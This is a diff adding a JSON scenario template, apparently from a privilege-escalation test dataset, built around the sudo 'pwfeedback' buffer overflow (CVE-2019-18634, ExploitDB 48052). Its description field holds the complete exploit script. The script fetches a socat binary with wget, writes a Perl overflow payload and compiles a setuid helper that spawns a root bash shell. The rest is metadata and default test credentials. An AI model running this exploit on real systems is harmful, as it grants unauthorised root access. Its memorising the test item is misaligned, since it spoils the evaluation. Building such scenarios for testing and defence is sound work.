@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_48052",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (CVE-2019-18634)\n\nExploit source code (48052.sh):\n```\n#!/bin/bash\n# We will need socat to run this.\nif [ ! -f socat ];\nthen\n    wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat\n    chmod +x socat\nfi\n\ncat <<EOF > xpl.pl\n\\$buf_sz = 256;\n\\$askpass_sz = 32;\n\\$signo_sz = 4*65;\n\\$tgetpass_flag = \"\\x04\\x00\\x00\\x00\" . (\"\\x00\"x24);\nprint(\"\\x00\\x15\"x(\\$buf_sz+\\$askpass_sz) .\n     (\"\\x00\\x15\"x\\$signo_sz) .\n     (\\$tgetpass_flag) . \"\\x37\\x98\\x01\\x00\\x35\\x98\\x01\\x00\\x35\\x98\\x01\\x00\\xff\\xff\\xff\\xff\\x35\\x98\\x01\\x00\\x00\\x00\\x00\\x00\".\n     \"\\x00\\x00\\x00\\x00\\x00\\x15\"x104 . \"\\n\");\nEOF\n\ncat <<EOF > exec.c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void)\n{\n        printf(\"Exploiting!\\n\");\n        int fd = open(\"/proc/self/exe\", O_RDONLY);\n        struct stat st;\n        fstat(fd, &st);\n        if (st.st_uid != 0)\n        {\n                fchown(fd, 0, st.st_gid);\n                fchmod(fd, S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);\n        }\n        else\n        {\n                setuid(0);\n                execve(\"/bin/bash\",NULL,NULL);\n        }\nreturn 0;\n}\nEOF\ncc -w exec.c -o /tmp/pipe\n./socat pty,link=/tmp/pty,waitslave exec:\"perl xpl.pl\"&\nsleep 0.5\nexport SUDO_ASKPASS=/tmp/pipe\nsudo -k -S id < /tmp/pty\n/tmp/pipe\n```",
+  "cve": "CVE-2019-18634",
+  "exploitdb_id": "48052",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_48052",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
